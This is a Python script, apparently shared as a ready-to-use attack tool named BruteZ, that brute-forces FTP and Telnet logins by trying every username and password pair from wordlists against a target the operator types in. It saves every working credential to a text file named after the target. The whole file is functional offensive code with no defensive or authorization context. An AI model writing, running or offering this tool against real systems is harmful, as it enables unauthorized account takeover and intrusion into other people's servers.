import ftplib
import telnetlib
import os
import sys
from time import sleep
import platform

# Tool Banner
def display_banner():
    # Clear the screen based on the OS
    os.system('cls' if platform.system().lower() == 'windows' else 'clear')

    banner = r"""
	 ____             _       _____
	| __ ) _ __ _   _| |_ ___|__  /
	|  _ \| '__| | | | __/ _ \ / / 
	| |_) | |  | |_| | ||  __// /_ 
	|____/|_|   \__,_|\__\___/____|

	     Created by Technical Corp
    """
    print(banner)

# Function to save successful credentials
def save_credentials(target, username, password):
    filename = f"{target}.txt"
    with open(filename, 'a') as file:
        file.write(f"{username}:{password}\n")
    print(f"[+] Credentials saved in {filename}")

# FTP Brute Force
def ftp_bruteforce(target, user_file, pass_file):
    try:
        with open(user_file, 'r') as uf, open(pass_file, 'r') as pf:
            usernames = uf.read().splitlines()
            passwords = pf.read().splitlines()

        for username in usernames:
            for password in passwords:
                try:
                    ftp = ftplib.FTP(target)
                    ftp.login(username, password)
                    print(f"[+] Success: {username}:{password}")
                    save_credentials(target, username, password)  # Save the credentials
                    ftp.quit()
                    return
                except ftplib.error_perm:
                    print(f"[-] Failed: {username}:{password}")
    except Exception as e:
        print(f"Error: {e}")

# Telnet Brute Force
def telnet_bruteforce(target, user_file, pass_file):
    try:
        with open(user_file, 'r') as uf, open(pass_file, 'r') as pf:
            usernames = uf.read().splitlines()
            passwords = pf.read().splitlines()

        for username in usernames:
            for password in passwords:
                try:
                    tn = telnetlib.Telnet(target)
                    tn.read_until(b"login: ")
                    tn.write(username.encode('ascii') + b"\n")
                    tn.read_until(b"Password: ")
                    tn.write(password.encode('ascii') + b"\n")
                    response = tn.read_some()
                    if b"incorrect" not in response:
                        print(f"[+] Success: {username}:{password}")
                        save_credentials(target, username, password)  # Save the credentials
                        tn.close()
                        return
                    else:
                        print(f"[-] Failed: {username}:{password}")
                except Exception as e:
                    print(f"[!] Error: {e}")
    except Exception as e:
        print(f"Error: {e}")

# Function to continue or exit after an attack
def ask_continue():
    while True:
        choice = input("\nDo you want to continue another attack? (y/n): ").strip().lower()
        if choice == 'y':
            return True
        elif choice == 'n':
            print("[*] Exiting tool. Goodbye!")
            sys.exit()
        else:
            print("[-] Invalid choice. Please enter 'y' or 'n'.")

# Main Function
def main():
    while True:
        display_banner()
        print("Choose Attack Method:")
        print("1. FTP Brute Force")
        print("2. Telnet Brute Force")
        choice = input("Enter your choice (1/2): ").strip()

        target = input("Enter target IP/Hostname: ").strip()
        user_file = input("Enter path to username file: ").strip()
        pass_file = input("Enter path to password file: ").strip()

        if not os.path.exists(user_file) or not os.path.exists(pass_file):
            print("[-] Error: Username or password file not found!")
            sys.exit()

        if choice == '1':
            ftp_bruteforce(target, user_file, pass_file)
        elif choice == '2':
            telnet_bruteforce(target, user_file, pass_file)
        else:
            print("[-] Invalid choice!")

        # Ask the user if they want to continue with another attack or exit
        if not ask_continue():
            break

if __name__ == "__main__":
    main()
